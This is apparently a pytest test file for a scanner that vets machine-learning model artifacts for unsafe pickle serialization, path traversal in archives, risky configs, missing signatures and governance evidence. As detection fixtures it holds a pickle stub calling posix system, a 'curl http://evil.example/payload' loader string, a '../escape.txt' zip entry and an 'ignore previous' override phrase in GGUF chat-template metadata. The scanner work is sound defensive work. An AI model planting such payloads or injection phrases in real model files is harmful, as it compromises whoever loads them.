import asyncio
import hashlib
import json
import zipfile
from datetime import datetime, timezone

from scanner.scanner_tools import model_intake
from scanner.scanner_tools.model_intake import (
    _intake_decision,
    normalize_model_artifact_reference,
    parse_huggingface_ref,
    run_model_intake_scan,
)


def _local_options(options=None):
    return {"allow_local_files": True, **(options or {})}


def _safetensors_bytes(metadata=None, tensors=None, payload=b"\0\0\0\0"):
    header = {"__metadata__": metadata or {}, **(tensors or {"weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, len(payload)]}})}
    raw_header = json.dumps(header, separators=(",", ":")).encode("utf-8")
    return len(raw_header).to_bytes(8, "little") + raw_header + payload


def test_model_intake_detects_pickle_and_missing_controls(tmp_path):
    artifact = tmp_path / "unsafe.pkl"
    artifact.write_bytes(b"\x80\x04cposix\nsystem\nq\x00.")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": True,
                "metadata_json": {},
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsafe_serialization" in finding_ids
    assert "model_intake:missing_signature" in finding_ids
    assert "model_intake:missing_checksum" in finding_ids
    assert "model_intake:missing_deployment_approval" in finding_ids
    assert result["model_intake"]["summary"]["format_posture"] == "unsafe_executable_serialization"
    assert result["result"]["grade"] == "F"


def test_model_intake_accepts_signed_safetensors_with_provenance(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.safetensors.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_deployment_approval": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "commit_sha": "abc123",
                    "base_model": "example/base-v1",
                    "tokenizer": "example/tokenizer-v1",
                    "training_data_ref": "dataset:v1",
                    "sigstore_verified": True,
                    "signature_cryptographically_verified": True,
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging", "production"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    assert result["findings"] == []
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"
    assert result["model_intake"]["summary"]["aibom_generated"] is True
    assert result["model_intake"]["summary"]["signature_verification_status"] == "verified"
    assert result["model_intake"]["aibom"]["completeness"]["fields"]["base_model"] is True
    assert any(component["type"] == "tokenizer" for component in result["model_intake"]["aibom"]["components"])
    assert result["result"]["grade"] == "A"
    assert result["result"]["decision"] == "allow"


def test_model_intake_license_policy_requires_permissive_status(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx model bytes")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "vendor-custom-license",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    assert result["model_intake"]["supply_chain"]["license_policy"]["status"] == "review_required"
    assert result["model_intake"]["checks"]["license_policy"] is False


def test_model_intake_does_not_flag_valid_safetensors_metadata_as_pickle(tmp_path):
    header = b'{"__metadata__":{"eval_set":"security-eval","note":"exec text in metadata is not pickle"},"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(len(header).to_bytes(8, "little") + header + b"\0\0\0\0")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.safetensors.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsafe_serialization" not in finding_ids
    assert result["model_intake"]["checks"]["unsafe_serialization"] is True
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"
    assert result["model_intake"]["supply_chain"]["format_inspection"]["safetensors_header"]["valid_json"] is True


def test_model_intake_does_not_compare_full_hash_to_truncated_sample(monkeypatch):
    artifact_bytes = b"a" * 1024
    full_artifact_sha = "06e413d5827a06921fac327ce46db2569a05107ca9723076176809dca1294563"

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        return artifact_bytes, {
            "source": "huggingface",
            "status": 206,
            "bytes_observed": len(artifact_bytes),
            "truncated": True,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    result = asyncio.run(
        run_model_intake_scan(
            "hf://acme/ranker@abc123/model.safetensors",
            {
                "expected_sha256": full_artifact_sha,
                "model_card_url": "https://huggingface.co/acme/ranker",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://huggingface.co/acme/ranker",
                    "license": "apache-2.0",
                    "sha256": full_artifact_sha,
                    "sha256_source": "huggingface_lfs",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            },
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:sha256_mismatch" not in finding_ids
    assert "model_intake:missing_checksum" not in finding_ids
    assert "model_intake:checksum_not_fully_verified" in finding_ids
    assert result["model_intake"]["summary"]["checksum_status"] == "known_unverified_truncated"
    assert result["model_intake"]["summary"]["expected_sha256"] == full_artifact_sha
    assert result["model_intake"]["summary"]["checksum_policy_status"] == "fail_unverified"
    assert result["model_intake"]["checks"]["checksum"] is False


def test_model_intake_allows_low_and_info_advisories():
    assert _intake_decision([{"severity": "low"}, {"severity": "info"}])["decision"] == "allow"
    assert _intake_decision([{"severity": "medium"}])["decision"] == "review"


def test_model_intake_uses_artifact_url_extension_when_display_name_has_dots(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "artifact_name": "model-intake.safe.safetensors.v1 local calibration",
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.safetensors.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    assert result["model_intake"]["summary"]["extension"] == ".safetensors"
    assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"


def test_model_intake_detects_pickle_and_executable_inside_archive(tmp_path):
    artifact = tmp_path / "bundle.zip"
    with zipfile.ZipFile(artifact, "w") as zf:
        zf.writestr("model/data.pkl", b"pickle")
        zf.writestr("scripts/install.sh", b"#!/bin/sh")

    result = asyncio.run(run_model_intake_scan(str(artifact), _local_options({"require_deployment_approval": False})))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsafe_serialization" in finding_ids
    assert "model_intake:embedded_executable" in finding_ids
    archive = result["model_intake"]["artifact"]["archive"]
    assert "model/data.pkl" in archive["pickle_entries"]
    assert "scripts/install.sh" in archive["executable_entries"]


def test_model_intake_flags_archive_traversal_nested_archive_and_risky_config(tmp_path):
    artifact = tmp_path / "bundle.zip"
    nested = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested, "w") as zf:
        zf.writestr("scripts/install.sh", b"#!/bin/sh")
    with zipfile.ZipFile(artifact, "w") as zf:
        zf.writestr("../escape.txt", b"escape")
        zf.write(nested, "nested.zip")
        zf.writestr("config.json", b'{"trust_remote_code": true}')

    result = asyncio.run(run_model_intake_scan(str(artifact), _local_options({"require_deployment_approval": False})))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:archive_path_traversal" in finding_ids
    assert "model_intake:nested_model_archive" in finding_ids
    assert "model_intake:risky_model_config" in finding_ids


def test_model_intake_flags_onnx_external_data_and_custom_operator(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"external_data location customop ai.onnx.contrib")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:onnx_external_data_reference" in finding_ids
    assert "model_intake:onnx_custom_operator" in finding_ids


def test_model_intake_flags_malformed_safetensors_header(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes((1024).to_bytes(8, "little") + b"{")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": False,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:safetensors_header_invalid" in finding_ids
    assert result["model_intake"]["checks"]["format_specific_inspection"] is False
    assert result["model_intake"]["summary"]["format_posture"] != "safer_static_format"


def test_model_intake_flags_suspicious_gguf_metadata(tmp_path):
    artifact = tmp_path / "model.gguf"
    artifact.write_bytes(b"GGUF" + (3).to_bytes(4, "little") + (1).to_bytes(8, "little") + (1).to_bytes(8, "little") + b" chat_template tool_call ignore previous")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": False,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:gguf_suspicious_metadata" in finding_ids
    assert result["model_intake"]["supply_chain"]["format_inspection"]["gguf"]["valid_header"] is True


def test_model_intake_strict_governance_requires_poisoning_lineage(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(_safetensors_bytes())

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "require_hash": False,
                "require_signature": False,
                "require_model_governance": True,
                "strict_governance": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": [{"name": "transformers"}]},
                    "malware_scan_result": {
                        "status": "clean",
                        "scanner": "yara",
                        "engine_version": "1",
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "artifact_digest": hashlib.sha256(artifact.read_bytes()).hexdigest(),
                    },
                    "security_evals": {
                        "status": "passed",
                        "suite_id": "security-v1",
                        "date": datetime.now(timezone.utc).isoformat(),
                        "target_sha256": hashlib.sha256(artifact.read_bytes()).hexdigest(),
                        "thresholds": {"leak_rate": 0},
                    },
                    "deployment_restrictions": ["production"],
                    "monitoring_plan": "monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:missing_dataset_lineage" in finding_ids
    assert "model_intake:missing_base_model_lineage" in finding_ids
    assert "model_intake:missing_poisoning_eval_evidence" in finding_ids
    assert result["model_intake"]["checks"]["dataset_lineage"] is False
    assert result["model_intake"]["checks"]["poisoning_evals"] is False


def test_model_intake_records_fetch_failures_as_findings(tmp_path):
    missing = tmp_path / "missing.safetensors"

    result = asyncio.run(run_model_intake_scan(str(missing), _local_options({"require_deployment_approval": False})))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:artifact_fetch_failed" in finding_ids
    assert result["model_intake"]["artifact"]["fetch"]["error"].startswith("FileNotFoundError")


def test_model_intake_blocks_local_file_reads_by_default(tmp_path):
    artifact = tmp_path / "model.safetensors"
    artifact.write_bytes(b"safe tensor bytes")

    result = asyncio.run(run_model_intake_scan(str(artifact), {"require_deployment_approval": False}))

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:artifact_fetch_failed" in finding_ids
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "local_file"
    assert "Local artifact reads are disabled" in result["model_intake"]["artifact"]["fetch"]["error"]


def test_model_intake_reports_unsupported_artifact_scheme():
    result = asyncio.run(
        run_model_intake_scan(
            "oci://honey/unsafe-pickle",
            {"timeout_seconds": 5},
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:unsupported_artifact_scheme" in finding_ids
    assert "model_intake:missing_license_review" in finding_ids
    assert "model_intake:missing_sbom_or_dependencies" in finding_ids
    assert any(finding["severity"] == "high" for finding in result["findings"])
    assert result["result"]["decision"] == "block"
    assert result["model_intake"]["summary"]["format_posture"] == "unknown_or_unclassified_format"


def test_model_intake_runs_metadata_governance_for_unsupported_registry_refs():
    result = asyncio.run(
        run_model_intake_scan(
            "oci://honey.local/models/safe:latest",
            {
                "expected_sha256": "abc",
                "signature_url": "https://example.test/model.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_deployment_approval": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            },
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert finding_ids == {"model_intake:unsupported_artifact_scheme"}
    assert result["model_intake"]["checks"]["license_review"] is True
    assert result["model_intake"]["checks"]["sbom_dependencies"] is True


def test_model_intake_reports_metadata_fetch_failure_without_fake_missing_governance(tmp_path):
    artifact = tmp_path / "model.onnx"
    metadata = tmp_path / "metadata.json"
    artifact.write_bytes(b"onnx bytes")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "metadata_url": str(metadata),
                "require_deployment_approval": True,
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:metadata_fetch_failed" in finding_ids
    assert "model_intake:missing_license_review" not in finding_ids
    assert "model_intake:missing_sbom_or_dependencies" not in finding_ids
    assert result["model_intake"]["checks"]["license_review"] is None
    assert result["model_intake"]["summary"]["metadata_fetch_failed"] is True


def test_model_intake_flags_missing_governance_metadata(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.onnx.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "commit_sha": "abc123",
                    "training_data_ref": "dataset:v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:missing_license_review" in finding_ids
    assert "model_intake:missing_sbom_or_dependencies" in finding_ids
    assert "model_intake:missing_eval_evidence" in finding_ids
    assert result["model_intake"]["checks"]["malware_scan"] is False


def test_model_intake_strict_governance_rejects_presence_only_evidence(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "require_signature": False,
                "require_deployment_approval": True,
                "strict_governance": True,
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean", "scanner": "yara", "timestamp": "2020-01-01T00:00:00Z"},
                    "security_evals": {"status": "passed", "suite_id": "redteam-v1"},
                    "deployment_restrictions": ["production"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:invalid_sbom_evidence" in finding_ids
    assert "model_intake:invalid_malware_scan_evidence" in finding_ids
    assert "model_intake:invalid_security_eval_evidence" in finding_ids
    assert "model_intake:incomplete_deployment_approval" in finding_ids
    assert result["model_intake"]["checks"]["sbom_dependencies"] is False
    assert result["model_intake"]["checks"]["malware_scan"] is False
    assert result["model_intake"]["checks"]["security_evals"] is False
    assert result["model_intake"]["checks"]["approval_evidence"] is False


def test_model_intake_strict_governance_accepts_structured_evidence(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()
    now = datetime.now(timezone.utc).isoformat()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "require_signature": False,
                "require_deployment_approval": True,
                "strict_governance": True,
                "deployment_approved": True,
                "model_card_url": "https://example.test/model-card",
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "apache-2.0",
                    "base_model": "example/base",
                    "training_data_ref": "dataset:v1",
                    "dataset_digest": "sha256:" + "d" * 64,
                    "fine_tuning_job": "train-job-1",
                    "poisoning_evals": {"status": "passed", "suite_id": "poisoning-v1"},
                    "sbom": {
                        "bomFormat": "CycloneDX",
                        "components": [{"name": "runtime", "purl": "pkg:pypi/runtime@1.0.0"}],
                    },
                    "malware_scan_result": {
                        "status": "clean",
                        "scanner": "yara",
                        "engine_version": "4.5.0",
                        "timestamp": now,
                        "artifact_digest": expected_sha,
                    },
                    "security_evals": {
                        "status": "passed",
                        "suite_id": "redteam-v1",
                        "date": now,
                        "target_sha256": expected_sha,
                        "thresholds": {"prompt_leakage": 0},
                    },
                    "deployment_restrictions": ["production"],
                    "monitoring_plan": "model-monitoring-v1",
                    "approved_by": "security",
                    "approved_at": now,
                    "policy_version": "prod-ai-v1",
                    "environment": "production",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:invalid_sbom_evidence" not in finding_ids
    assert "model_intake:invalid_malware_scan_evidence" not in finding_ids
    assert "model_intake:invalid_security_eval_evidence" not in finding_ids
    assert "model_intake:incomplete_deployment_approval" not in finding_ids
    assert result["model_intake"]["checks"]["sbom_dependencies"] is True
    assert result["model_intake"]["checks"]["malware_scan"] is True
    assert result["model_intake"]["checks"]["security_evals"] is True
    assert result["model_intake"]["checks"]["approval_evidence"] is True
    assert result["model_intake"]["checks"]["dataset_lineage"] is True
    assert result["model_intake"]["checks"]["dataset_digest"] is True
    assert result["model_intake"]["checks"]["base_model_lineage"] is True
    assert result["model_intake"]["checks"]["poisoning_evals"] is True


def test_model_intake_can_require_signature_verification(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.onnx.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_signature_verification": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "commit_sha": "abc123",
                    "training_data_ref": "dataset:v1",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:signature_not_verified" in finding_ids
    assert result["model_intake"]["checks"]["signature_verification"] is False


def test_model_intake_treats_metadata_signature_claim_as_unverified(tmp_path):
    artifact = tmp_path / "model.onnx"
    artifact.write_bytes(b"onnx bytes")
    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.onnx.sig",
                "model_card_url": "https://example.test/model-card",
                "deployment_approved": True,
                "require_signature_verification": True,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "sigstore_verified": True,
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:signature_not_verified" in finding_ids
    assert result["model_intake"]["summary"]["signature_verification_status"] == "claimed_verified"
    assert result["model_intake"]["summary"]["signature_claimed_verified"] is True
    assert result["model_intake"]["summary"]["signature_cryptographically_verified"] is False


def test_model_intake_flags_restricted_license_and_loader_markers(tmp_path):
    artifact = tmp_path / "model.bin"
    artifact.write_bytes(b"model bytes with subprocess and curl http://evil.example/payload")

    result = asyncio.run(
        run_model_intake_scan(
            str(artifact),
            _local_options({
                "require_deployment_approval": False,
                "metadata_json": {
                    "source_repo": "https://github.com/example/model",
                    "license": "research only non-commercial",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            }),
        )
    )

    finding_ids = {finding["id"] for finding in result["findings"]}
    assert "model_intake:restricted_license_policy" in finding_ids
    assert "model_intake:suspicious_loader_markers" in finding_ids
    assert result["model_intake"]["supply_chain"]["license_policy"]["status"] == "restricted"
    assert result["model_intake"]["checks"]["license_policy"] is False


def test_model_intake_parses_huggingface_refs():
    parsed = parse_huggingface_ref("https://huggingface.co/acme/ranker/blob/main/model.safetensors")

    assert parsed["repo_id"] == "acme/ranker"
    assert parsed["filename"] == "model.safetensors"
    assert parsed["revision"] == "main"
    assert parsed["resolve_url"] == "https://huggingface.co/acme/ranker/resolve/main/model.safetensors"

    parsed = parse_huggingface_ref("hf://acme/ranker@abc123/weights/model.onnx")
    assert parsed["repo_id"] == "acme/ranker"
    assert parsed["filename"] == "weights/model.onnx"
    assert parsed["revision"] == "abc123"


def test_model_intake_fetches_huggingface_resolve_url(monkeypatch):
    artifact_bytes = b"safe tensor bytes"
    expected_sha = hashlib.sha256(artifact_bytes).hexdigest()
    observed_urls = []
    observed_headers = []

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        observed_urls.append(url)
        observed_headers.append(headers or {})
        return artifact_bytes, {
            "source": "http",
            "status": 206,
            "bytes_observed": len(artifact_bytes),
            "truncated": False,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    result = asyncio.run(
        run_model_intake_scan(
            "hf://acme/ranker@abc123/model.safetensors",
            {
                "expected_sha256": expected_sha,
                "signature_url": "https://example.test/model.sig",
                "model_card_url": "https://huggingface.co/acme/ranker",
                "deployment_approved": True,
                "metadata_json": {
                    "source_repo": "https://huggingface.co/acme/ranker",
                    "hf_token": "hf_test_token",
                    "license": "apache-2.0",
                    "sbom": {"components": []},
                    "malware_scan_result": {"status": "clean"},
                    "security_evals": {"status": "passed"},
                    "deployment_restrictions": ["staging"],
                    "monitoring_plan": "model-monitoring-v1",
                },
            },
        )
    )

    assert observed_urls == ["https://huggingface.co/acme/ranker/resolve/abc123/model.safetensors"]
    assert observed_headers == [{"Authorization": "Bearer hf_test_token"}]
    assert result["model_intake"]["summary"]["source_kind"] == "huggingface"
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "huggingface"
    assert result["model_intake"]["artifact"]["fetch"]["authenticated"] is True
    assert result["model_intake"]["artifact"]["fetch"]["auth_source"] == "metadata"
    assert result["model_intake"]["metadata"]["hf_token"] == "***"
    assert not any(finding["id"] == "model_intake:artifact_fetch_failed" for finding in result["findings"])


def test_model_intake_normalizes_cloud_and_registry_refs():
    s3_ref = normalize_model_artifact_reference("s3://models-prod/releases/ranker/model.safetensors")
    assert s3_ref["kind"] == "s3"
    assert s3_ref["bucket"] == "models-prod"
    assert s3_ref["object_key"] == "releases/ranker/model.safetensors"
    assert s3_ref["format_posture"] == "safer_static_format"
    assert s3_ref["metadata"]["storage_provider"] == "s3"
    assert s3_ref["fetch_url"] == "https://models-prod.s3.amazonaws.com/releases/ranker/model.safetensors"
    assert s3_ref["warnings"]

    gcs_ref = normalize_model_artifact_reference("https://storage.googleapis.com/ml-bucket/releases/model.onnx", platform="gcs")
    assert gcs_ref["kind"] == "gcs"
    assert gcs_ref["bucket"] == "ml-bucket"
    assert gcs_ref["object_key"] == "releases/model.onnx"
    assert gcs_ref["fetchable"] is True
    assert gcs_ref["warnings"] == []

    azure_ref = normalize_model_artifact_reference("azure://acct/models/release/model.gguf")
    assert azure_ref["kind"] == "azure_blob"
    assert azure_ref["account"] == "acct"
    assert azure_ref["container"] == "models"
    assert azure_ref["blob_path"] == "release/model.gguf"
    assert azure_ref["fetch_url"] == "https://acct.blob.core.windows.net/models/release/model.gguf"

    oci_ref = normalize_model_artifact_reference("oci://registry.example.com/ml/ranker:latest")
    assert oci_ref["kind"] == "oci"
    assert oci_ref["registry"] == "registry.example.com"
    assert oci_ref["repository"] == "ml/ranker"
    assert oci_ref["tag"] == "latest"
    assert any("digest" in warning for warning in oci_ref["warnings"])

    mlflow_ref = normalize_model_artifact_reference("models:/fraud-detector/Production", platform="mlflow")
    assert mlflow_ref["kind"] == "mlflow"
    assert mlflow_ref["model_name"] == "fraud-detector"
    assert mlflow_ref["stage"] == "Production"


def test_model_intake_auto_detects_common_provider_urls():
    s3_ref = normalize_model_artifact_reference("https://models-prod.s3.amazonaws.com/releases/model.safetensors")
    assert s3_ref["kind"] == "s3"
    assert s3_ref["bucket"] == "models-prod"
    assert s3_ref["fetch_url"] == "https://models-prod.s3.amazonaws.com/releases/model.safetensors"

    gcs_ref = normalize_model_artifact_reference("https://storage.googleapis.com/ml-bucket/releases/model.onnx")
    assert gcs_ref["kind"] == "gcs"
    assert gcs_ref["bucket"] == "ml-bucket"
    assert gcs_ref["object_key"] == "releases/model.onnx"

    azure_ref = normalize_model_artifact_reference("https://acct.blob.core.windows.net/models/release/model.gguf")
    assert azure_ref["kind"] == "azure_blob"
    assert azure_ref["account"] == "acct"
    assert azure_ref["container"] == "models"

    mlflow_ref = normalize_model_artifact_reference("runs:/abc123/model", platform="auto")
    assert mlflow_ref["kind"] == "mlflow"
    assert mlflow_ref["run_id"] == "abc123"
    assert mlflow_ref["path"] == "model"


def test_model_intake_fetches_public_cloud_object_refs(monkeypatch):
    artifact_bytes = b"safe tensor bytes"
    expected_sha = hashlib.sha256(artifact_bytes).hexdigest()
    observed_urls = []

    def fake_download_http(url, max_bytes, timeout_seconds, headers=None):
        observed_urls.append(url)
        return artifact_bytes, {
            "source": "http",
            "status": 206,
            "bytes_observed": len(artifact_bytes),
            "truncated": False,
        }

    monkeypatch.setattr(model_intake, "_download_http", fake_download_http)

    base_options = {
        "expected_sha256": expected_sha,
        "signature_url": "https://example.test/model.sig",
        "model_card_url": "https://example.test/model-card",
        "deployment_approved": True,
        "metadata_json": {
            "source_repo": "https://example.test/repo",
            "license": "apache-2.0",
            "sbom": {"components": []},
            "malware_scan_result": {"status": "clean"},
            "security_evals": {"status": "passed"},
            "deployment_restrictions": ["staging"],
            "monitoring_plan": "model-monitoring-v1",
        },
    }

    result = asyncio.run(run_model_intake_scan("s3://models-prod/releases/model.safetensors", base_options))
    assert observed_urls[-1] == "https://models-prod.s3.amazonaws.com/releases/model.safetensors"
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "s3"
    assert "model_intake:artifact_fetch_failed" not in {finding["id"] for finding in result["findings"]}

    result = asyncio.run(run_model_intake_scan("gs://ml-bucket/releases/model.onnx", base_options))
    assert observed_urls[-1] == "https://storage.googleapis.com/ml-bucket/releases/model.onnx"
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "gcs"

    result = asyncio.run(run_model_intake_scan("azure://acct/models/release/model.gguf", base_options))
    assert observed_urls[-1] == "https://acct.blob.core.windows.net/models/release/model.gguf"
    assert result["model_intake"]["artifact"]["fetch"]["source"] == "azure_blob"
